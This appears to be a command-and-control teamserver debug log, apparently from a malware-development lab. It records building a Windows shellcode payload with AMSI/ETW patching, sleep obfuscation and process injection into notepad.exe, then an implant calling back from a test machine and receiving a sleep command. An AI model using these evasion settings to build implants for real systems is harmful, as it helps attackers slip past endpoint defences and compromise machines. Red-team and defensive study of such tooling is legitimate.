+[05:50:34] [DBUG] [server.(*Teamserver).DispatchEvent.func18:882]: Windows Shellcode
+[05:50:34] [DBUG] [builder.(*Builder).PatchConfig:579]: map[Amsi/Etw Patch:Hardware breakpoints Indirect Syscall:false Injection:map[Alloc:Native/Syscall Execute:Native/Syscall Spawn32:C:\Windows\SysWOW64\notepad.exe Spawn64:C:\Windows\System32\notepad.exe] Jitter:15 Proxy Loading:RtlRegisterWait Sleep:2 Sleep Jmp Gadget:jmp rax Sleep Technique:Foliage Stack Duplication:false]
+[05:50:34] [DBUG] [builder.(*Builder).PatchConfig:915]: Host => 192.168.17.137
+[05:50:34] [DBUG] [builder.(*Builder).PatchConfig:940]: host only
+[05:50:34] [DBUG] [builder.(*Builder).PatchConfig:971]: 
+[05:50:34] [DBUG] [builder.(*Builder).PatchConfig:982]: 
+[05:50:34] [DBUG] [builder.(*Builder).Build:331]: /usr/bin/nasm -f win64 src/asm/Spoof.x64.asm -o /tmp/614c77386d/062e9877d3.o
+[05:50:34] [DBUG] [builder.(*Builder).Build:331]: /usr/bin/nasm -f win64 src/asm/Syscall.x64.asm -o /tmp/614c77386d/e56537a356.o
+[05:50:34] [DBUG] [builder.(*Builder).Build:389]: Compile dll and prepend shellcode to it.
+[05:50:34] [DBUG] [builder.NewBuilder:179]: Payload Builder: Enable Debug Mode false
+[05:50:34] [DBUG] [builder.(*Builder).SetPatchConfig:465]: Set Patch config from Profile
+[05:50:34] [DBUG] [builder.(*Builder).PatchConfig:579]: map[Amsi/Etw Patch:Hardware breakpoints Indirect Syscall:false Injection:map[Alloc:Native/Syscall Execute:Native/Syscall Spawn32:C:\Windows\SysWOW64\notepad.exe Spawn64:C:\Windows\System32\notepad.exe] Jitter:15 Proxy Loading:RtlRegisterWait Sleep:2 Sleep Jmp Gadget:jmp rax Sleep Technique:Foliage Stack Duplication:false]
+[05:50:34] [DBUG] [builder.(*Builder).PatchConfig:915]: Host => 192.168.17.137
+[05:50:34] [DBUG] [builder.(*Builder).PatchConfig:940]: host only
+[05:50:34] [DBUG] [builder.(*Builder).PatchConfig:971]: 
+[05:50:34] [DBUG] [builder.(*Builder).PatchConfig:982]: 
+[05:50:34] [DBUG] [builder.(*Builder).Build:331]: /usr/bin/nasm -f win64 src/asm/Spoof.x64.asm -o /tmp/835e911c4f/56f704569f.o
+[05:50:34] [DBUG] [builder.(*Builder).Build:331]: /usr/bin/nasm -f win64 src/asm/Syscall.x64.asm -o /tmp/835e911c4f/cebc373cba.o
+[05:50:34] [DBUG] [builder.(*Builder).Build:379]: Compile dll
+[05:51:55] [DBUG] [builder.(*Builder).Build:410]: Successful compiled Dll
+[05:54:24] [DBUG] [handlers.handleDemonAgent:262]: Agent does not exists. hope this is a register request
+[05:54:24] [DBUG] [agent.ParseDemonRegisterRequest:404]: Parsed DemonID: 19948ae
+[05:54:24] [DBUG] [agent.ParseDemonRegisterRequest:412]: AgentID (19948ae) == DemonID (19948ae)
+
+[05:54:24] [DBUG] [agent.ParseDemonRegisterRequest:424]: 
+Hostname: WINDEV2401EVAL
+Username: User
+Domain  : 
+InternIP: 192.168.17.131
+ExternIP: 192.168.17.131
+
+[05:54:24] [DBUG] [agent.ParseDemonRegisterRequest:441]: 
+ProcessName : C:\Users\User\Desktop\WinDev\Maldev\Maldev2\RE_Loader\x64\Release\RE_Loader.exe
+ProcessPID  : 5572
+ProcessTID  : 21068
+ProcessPPID : 0
+ProcessArch : 2
+Elevated    : 0
+Base Address: 0x1fbf7130000
+
+[05:54:24] [DBUG] [agent.ParseDemonRegisterRequest:459]: 
+SleepDelay  : 2
+SleepJitter : 15
+
+[05:54:24] [DBUG] [agent.ParseDemonRegisterRequest:594]: Finished parsing demon
+[05:54:24] [DBUG] [packer.(*Packer).Build:87]: No Aes Key specified
+[05:54:24] [DBUG] [handlers.handleDemonAgent:295]: Finished request
+[05:54:37] [DBUG] [agent.(*Agent).TaskDispatch:2661]: Agent: 19948ae, Command: COMMAND_SLEEP, SleepDelay: 3, SleepJitter: 0
